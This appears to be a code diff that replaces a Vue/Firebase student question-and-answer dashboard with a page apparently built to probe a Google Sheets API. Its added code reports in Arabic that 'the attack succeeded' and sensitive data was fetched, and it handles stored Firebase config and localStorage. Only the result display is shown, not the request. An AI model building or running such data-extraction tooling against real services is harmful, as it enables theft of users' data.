-        const qPath = `${QUESTIONS_REF_PATH}/${studentSection.value}/${selectedSubject.key}/chapter${selectedChapter.value}/${questionId}`;
-        
-        const originalQuestion = questions.value.find(q => q.id === questionId);
-        
-        if (originalQuestion.studentCode !== studentCode) return; // حماية: فقط صاحب السؤال يمكنه التحديد
-        
-        // 1. إلغاء تحديد أي أفضل إجابة سابقة في نفس السؤال
-        if (originalQuestion.replies) {
-             Object.values(originalQuestion.replies).forEach(r => {
-                 if (r.isBestAnswer) {
-                     db.ref(`${qPath}/replies/${r.id}`).update({ isBestAnswer: false });
-                 }
-             });
-        }
-        
-        // 2. تحديد الإجابة الجديدة كـ "أفضل إجابة"
-        await db.ref(`${qPath}/replies/${replyId}`).update({ isBestAnswer: true });
-        
-        alert('✅ تم تحديد أفضل إجابة بنجاح!');
-    };
+            resultsDiv.innerHTML = '<span class="data-title">🔥 نتيجة الطلب المباشر على Google Sheets API:</span><br>';
+            resultsDiv.innerHTML += JSON.stringify(data, null, 2);
 
-    // 🚨 Questions & Replies Logic
-    
-    const fetchQuestions = () => {
-        if (!selectedSubject.key || !selectedChapter.value) return;
-
-        const path = `${QUESTIONS_REF_PATH}/${studentSection.value}/${selectedSubject.key}/chapter${selectedChapter.value}`;
-
-        db.ref(path).on('value', (snapshot) => {
-            const data = snapshot.val();
-            let qArray = [];
-
-            if (data) {
-                Object.keys(data).forEach(qId => {
-                    const q = data[qId];
-                    const repliesCount = q.replies ? Object.keys(q.replies).length : 0;
-                    
-                    // 🚨 Count Reactions
-                    const reactionsMap = q.reactions ? Object.values(q.reactions) : [];
-                    const likesCount = reactionsMap.filter(r => r.type === 'like').length;
-                    const dislikesCount = reactionsMap.filter(r => r.type === 'dislike').length;
-                    const userReaction = q.reactions && q.reactions[studentCode] ? q.reactions[studentCode].type : null;
-                    
-                    let repliesArray = q.replies ? Object.keys(q.replies).map(rId => {
-                        const r = q.replies[rId];
-                        
-                        // 🚨 Count Reply Reactions
-                        const rReactionsMap = r.reactions ? Object.values(r.reactions) : [];
-                        const rLikesCount = rReactionsMap.filter(rx => rx.type === 'like').length;
-                        const rDislikesCount = rReactionsMap.filter(rx => rx.type === 'dislike').length;
-                        const rUserReaction = r.reactions && r.reactions[studentCode] ? r.reactions[studentCode].type : null;
-                        
-                        return { 
-                            id: rId, 
-                            ...r, 
-                            likesCount: rLikesCount, 
-                            dislikesCount: rDislikesCount,
-                            userReaction: rUserReaction,
-                            isBestAnswer: !!r.isBestAnswer // إضافة حالة أفضل إجابة
-                        };
-                    }).sort((a, b) => b.timestamp - a.timestamp) : [];
-
-                    qArray.push({
-                        id: qId,
-                        ...q,
-                        repliesCount: repliesCount,
-                        likesCount: likesCount,
-                        dislikesCount: dislikesCount,
-                        userReaction: userReaction,
-                        replies: repliesArray,
-                        showReplies: false, 
-                        replyText: '' 
-                    });
-                });
+            if (data.result === "success") {
+                resultsDiv.innerHTML += "<br><span class='success'>✅ نجح الهجوم! تم جلب بيانات حساسة.</span>";
+            } else {
+                resultsDiv.innerHTML += "<br><span class='error'>❌ فشل. الـ API رد برسالة: " + data.message + "</span>";
             }
-            
-            questions.value = qArray.sort((a, b) => b.timestamp - a.timestamp);
-        });
-    };
-    
-    const openNewQuestionModal = () => {
-        newQuestionText.value = '';
-        showNewQuestionModal.value = true;
-    };
 
-    const addNewQuestion = async () => {
-        const text = newQuestionText.value.trim();
-        if (text.length === 0) return;
+        } catch (err) {
+            resultsDiv.innerHTML = "<span class='error'>⚠ حدث خطأ أثناء الاتصال أو جلب البيانات.</span>";
+            console.error(err);
+        }
+    }
 
-        const path = `${QUESTIONS_REF_PATH}/${studentSection.value}/${selectedSubject.key}/chapter${selectedChapter.value}`;
-        const newQRef = db.ref(path).push();
-        const newQId = newQRef.key;
-
-        await newQRef.set({
-            text: text,
-            studentCode: studentCode,
-            studentName: studentName.value,
-            timestamp: firebase.database.ServerValue.TIMESTAMP,
-            subjectKey: selectedSubject.key,
-            chapter: selectedChapter.value,
-            section: studentSection.value 
-        });
-        
-        // إرسال إشعار للممنشنين
-        const mentions = parseMentions(text);
-        mentions.forEach(recipientCode => {
-            createNotification(recipientCode, studentCode, 'mention', newQId, text);
-        });
-
-        showNewQuestionModal.value = false;
-        newQuestionText.value = '';
-        alert('✅ تم نشر سؤالك بنجاح!');
-    };
-
-    const showReplies = (q) => {
-        q.showReplies = !q.showReplies;
-    };
-
-    const addReply = async (q) => {
-        const text = q.replyText.trim();
-        if (text.length === 0) return;
-
-        const questionId = q.id;
-        const path = `${QUESTIONS_REF_PATH}/${studentSection.value}/${selectedSubject.key}/chapter${selectedChapter.value}/${questionId}/replies`;
-        const newReplyRef = db.ref(path).push();
-
-        await newReplyRef.set({
-            text: text,
-            studentCode: studentCode,
-            timestamp: firebase.database.ServerValue.TIMESTAMP,
-            section: studentSection.value 
-        });
-
-        // إرسال إشعار لصاحب السؤال
-        createNotification(q.studentCode, studentCode, 'reply', questionId, q.text);
-        
-        // إرسال إشعار للممنشنين
-        const mentions = parseMentions(text);
-        mentions.forEach(recipientCode => {
-            createNotification(recipientCode, studentCode, 'mention', questionId, text);
-        });
-
-        q.replyText = '';
-        alert('✅ تم نشر ردك بنجاح!');
-    };
-    
     /**
-     * 🚨 دالة التفاعل المطورة (أنظف وأكثر تركيزاً)
-     * @param {string} questionId - ID السؤال.
-     * @param {string|null} replyId - ID الرد، أو null للسؤال.
-     * @param {string} reactionType - نوع التفاعل ('like' أو 'dislike').
-     * @param {string} originalPosterCode - كود صاحب السؤال/الرد الأصلي.
-     * @param {boolean} isReply - هل التفاعل على رد؟
+     * مسح كل البيانات المخزنة
      */
-    const toggleReaction = async (questionId, replyId, reactionType, originalPosterCode, isReply = false) => {
-        const qPath = `${QUESTIONS_REF_PATH}/${studentSection.value}/${selectedSubject.key}/chapter${selectedChapter.value}/${questionId}`;
-        
-        // تحديد المسار الصحيح للتفاعل (سؤال أو رد)
-        const reactionPath = replyId ? `${qPath}/replies/${replyId}/reactions/${studentCode}` : `${qPath}/reactions/${studentCode}`;
-        
-        // جلب التفاعل الحالي للمستخدم
-        let currentReaction = null;
-        if (replyId) {
-             const reply = questions.value.find(q => q.id === questionId)?.replies.find(r => r.id === replyId);
-             currentReaction = reply?.userReaction;
-        } else {
-             currentReaction = questions.value.find(q => q.id === questionId)?.userReaction;
-        }
-
-        if (currentReaction === reactionType) {
-            // إلغاء التفاعل الحالي
-            await db.ref(reactionPath).remove();
-        } else {
-            // إضافة التفاعل الجديد
-            await db.ref(reactionPath).set({ type: reactionType, timestamp: firebase.database.ServerValue.TIMESTAMP });
-            
-            // 🚨 إرسال إشعار (Notification) إذا كان 'like' فقط
-            if (reactionType === 'like') {
-                const refText = isReply 
-                    ? questions.value.find(q => q.id === questionId).replies.find(r => r.id === replyId).text
-                    : questions.value.find(q => q.id === questionId).text;
-
-                createNotification(originalPosterCode, studentCode, 'like', questionId, refText, isReply);
-            }
-        }
-    };
-
-
-    // 🚨 Initialization 
-    const fetchAllQuestionsForProfile = () => {
-        const allQRef = db.ref(`${QUESTIONS_REF_PATH}`);
-        // ⚠️ الاستماع 'value' وليس 'child_added' لجلب البيانات مرة واحدة وتحديثها
-        allQRef.on('value', (snapshot) => {
-            const data = snapshot.val();
-            const allQMap = {};
-            
-            if (data) {
-                Object.keys(data).forEach(sectionKey => {
-                    if (data[sectionKey]) {
-                        Object.keys(data[sectionKey]).forEach(subjectKey => {
-                            if (data[sectionKey][subjectKey]) {
-                                Object.keys(data[sectionKey][subjectKey]).forEach(chapterKey => {
-                                    if (data[sectionKey][subjectKey][chapterKey]) {
-                                        Object.keys(data[sectionKey][subjectKey][chapterKey]).forEach(qId => {
-                                            const q = data[sectionKey][subjectKey][chapterKey][qId];
-                                            allQMap[qId] = { 
-                                                id: qId, 
-                                                ...q, 
-                                                section: sectionKey, 
-                                                subjectKey: subjectKey,
-                                                chapter: parseInt(chapterKey.replace('chapter', '')),
-                                                repliesCount: q.replies ? Object.keys(q.replies).length : 0 
-                                            };
-                                        });
-                                    }
-                                });
-                            }
-                        });
-                    }
-                });
-            }
-            allQuestionsData.value = allQMap;
-        });
-    };
-
-    fetchAllQuestionsForProfile();
-    fetchNotifications();
-
-
-    createApp({
-        setup() {
-            return {
-                studentCode,
-                studentName,
-                STUDENT_SECTION, // Now a constant
-                currentPage,
-                subjects,
-                selectedSubject,
-                selectedChapter,
-                questions,
-                showNewQuestionModal,
-                newQuestionText,
-                notifications,
-                unreadCount,
-                myQuestions,
-                myReplies,
-                profileTab,
-                newDisplayName,
-                
-                // Methods
-                logout,
-                backToSubjects,
-                backToChapters,
-                selectSubject,
-                selectChapter,
-                fetchQuestions,
-                openNewQuestionModal,
-                addNewQuestion,
-                showReplies,
-                addReply,
-                toggleReaction,
-                formatTimestamp,
-                goToNotification,
-                updateDisplayName,
-                goToQuestion,
-                goToReply,
-                markBestAnswer,
-                toggleTheme
-            };
-        }
-    }).mount('#dashboard-app');
-}
+    function clearLocalStorage() {
+        localStorage.clear();
+        document.getElementById("localData").innerHTML = "";
+        document.getElementById("results").innerHTML = "";
+        document.getElementById("firebaseConfigData").innerHTML = "";
+        alert("تم مسح كل بيانات Local Storage بنجاح!");
+    }
 </script>
-<style>
-/* 🚨 Add the missing CSS for the Profile Tabs (since we kept it in the <style> block) */
-.active-tab-link {
-    border-bottom: 2px solid var(--accent);
-    color: var(--accent);
-}
-</style>
+
 </body>
 </html>
